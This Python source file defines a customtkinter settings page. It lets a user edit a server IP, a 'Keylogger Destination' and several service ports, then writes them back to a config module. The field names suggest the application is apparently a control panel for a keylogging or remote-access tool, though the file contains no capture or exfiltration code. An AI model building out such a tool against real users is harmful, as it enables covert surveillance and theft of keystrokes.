# gui/settings_page.py
import customtkinter as ctk
import config

class SettingsPage(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        
        self.label = ctk.CTkLabel(self, text="Application Settings", font=("Roboto", 24, "bold"))
        self.label.pack(pady=20)

        # הגדרת IP של השרת
        self.ip_label = ctk.CTkLabel(self, text="Server IP Address:")
        self.ip_label.pack(pady=5)
        self.ip_entry = ctk.CTkEntry(self, width=250)
        self.ip_entry.insert(0, config.HOST_IP) # מציג את הערך הנוכחי מ-config
        self.ip_entry.pack(pady=5)

        # הגדרת יעד Keylogger
        self.keylogger_label = ctk.CTkLabel(self, text="Keylogger Destination:")
        self.keylogger_label.pack(pady=5)
        self.keylogger_entry = ctk.CTkEntry(self, width=250)
        self.keylogger_entry.insert(0, config.KEYLOGGER_DESTINATION)
        self.keylogger_entry.pack(pady=5)


        #Ports
        self.separator = ctk.CTkLabel(self, text="--- Service Ports ---")
        self.separator.pack(pady=10)

        # יצירת שדות לפורטים באופן דינמי
        self.port_entries = {} # מילון לשמירת ה-Widgets

        for service_name, current_port in config.PORTS.items():
            frame = ctk.CTkFrame(self, fg_color="transparent")
            frame.pack(pady=5)
            
            lbl = ctk.CTkLabel(frame, text=f"{service_name}:", width=120, anchor="w")
            lbl.pack(side="left", padx=5)
            
            entry = ctk.CTkEntry(frame, width=100)
            entry.insert(0, str(current_port))
            entry.pack(side="left", padx=5)
            
            # שומרים את ה-Entry עם המפתח של שם השירות
            self.port_entries[service_name] = entry

        # כפתור שמירה
        self.save_btn = ctk.CTkButton(self, text="Save Settings", command=self.save_settings)
        self.save_btn.pack(pady=20)

    def save_settings(self):
        config.HOST_IP = self.ip_entry.get()
        config.KEYLOGGER_DESTINATION = self.keylogger_entry.get()

        # 2. עדכון כל הפורטים בלולאה
        for service_name, entry_widget in self.port_entries.items():
            try:
                new_port = int(entry_widget.get())
                config.PORTS[service_name] = new_port
            except ValueError:
                print(f"Invalid port for {service_name}")

        print("Settings saved successfully!")
        print(f"New Config: IP={config.HOST_IP}, KeyloggerDest={config.KEYLOGGER_DESTINATION}, Ports={config.PORTS}")